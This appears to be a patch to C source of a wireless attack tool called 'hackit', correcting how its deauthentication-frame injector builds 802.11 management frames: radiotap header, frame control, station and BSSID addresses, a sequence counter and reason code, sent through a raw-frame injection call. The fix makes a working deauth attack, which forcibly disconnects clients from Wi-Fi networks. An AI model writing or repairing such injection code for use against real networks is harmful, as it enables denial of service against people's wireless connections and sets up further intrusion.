@@ -84,7 +84,7 @@ static void build_radiotap_header(uint8_t* out, int* out_len) {
     out[2] = (uint8_t)(HACKIT_80211_radiotap_LEN & 0xFF);
     out[3] = (uint8_t)((HACKIT_80211_radiotap_LEN >> 8) & 0xFF);
     out[4] = 0x02; out[5] = 0x00; out[6] = 0x00; out[7] = 0x00;
-    out[8] = 0x14;
+    out[8] = 0x00;
     *out_len = HACKIT_80211_radiotap_LEN;
 }
 
@@ -232,17 +232,17 @@ bool hackit_inject_deauth(const char* iface, const uint8_t* bssid, const uint8_t
     memset(frame, 0, sizeof(frame));
     memcpy(frame, radiotap, rad_len);
     uint8_t* fc = &frame[rad_len];
-    fc[0] = 0x00;
-    fc[1] = 0x00;
-    fc[0] = 0xC0;
-    fc[1] = 0x00;
-    fc[2] = 0x00;
-    fc[3] = 0x00;
-    memcpy(&frame[rad_len + 4], station, 6);
-    memcpy(&frame[rad_len + 10], bssid, 6);
-    memcpy(&frame[rad_len + 16], bssid, 6);
-    frame[rad_len + 22] = (uint8_t)(reason & 0xFF);
-    frame[rad_len + 23] = (uint8_t)((reason >> 8) & 0xFF);
+    fc[0] = 0xC0; fc[1] = 0x00;
+    fc[2] = 0x01; fc[3] = 0x3A;
+    memcpy(&fc[4], station, 6);
+    memcpy(&fc[10], bssid, 6);
+    memcpy(&fc[16], bssid, 6);
+    static uint16_t seq = 0;
+    seq = (seq + 1) & 0xFFF;
+    fc[22] = (uint8_t)((seq << 4) & 0xFF);
+    fc[23] = (uint8_t)((seq << 4) >> 8);
+    fc[24] = (uint8_t)(reason & 0xFF);
+    fc[25] = (uint8_t)((reason >> 8) & 0xFF);
     return hackit_inject_raw_frame(iface, frame, rad_len + HACKIT_80211_MGMT_HDR_LEN + 2);
 }
 
